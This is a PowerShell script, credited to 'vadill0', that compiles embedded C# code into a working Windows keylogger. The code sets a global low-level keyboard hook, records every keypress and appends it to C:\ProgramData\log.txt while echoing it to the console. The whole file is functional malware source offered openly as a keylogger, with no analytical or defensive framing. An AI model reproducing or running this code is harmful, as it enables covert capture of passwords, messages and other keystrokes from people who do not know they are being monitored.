#Powershell keylogger
#author vadill0
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Keylogger
{
    public static class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const string LOGROUTE = @"C:\ProgramData\log.txt";
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallBack;
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    StreamWriter output = new StreamWriter(LOGROUTE, true);
                    output.Write(".");
                    Console.Write(".");
                    output.Close();
                }else if(((Keys)vkCode).ToString() == "Oemcomma")
                {
                    StreamWriter output = new StreamWriter(LOGROUTE, true);
                    output.Write(",");
                    Console.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    StreamWriter output = new StreamWriter(LOGROUTE, true);
                    output.Write(" ");
                    Console.Write(" ");
                    output.Close();
                }
                else
                {
                    StreamWriter output = new StreamWriter(LOGROUTE, true);
                    output.Write((Keys)vkCode);
                    Console.Write((Keys)vkCode);
                    output.Close();
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String moduleName);
    }
}

"@ -ReferencedAssemblies System.Windows.Forms
[Keylogger.Program]::Main();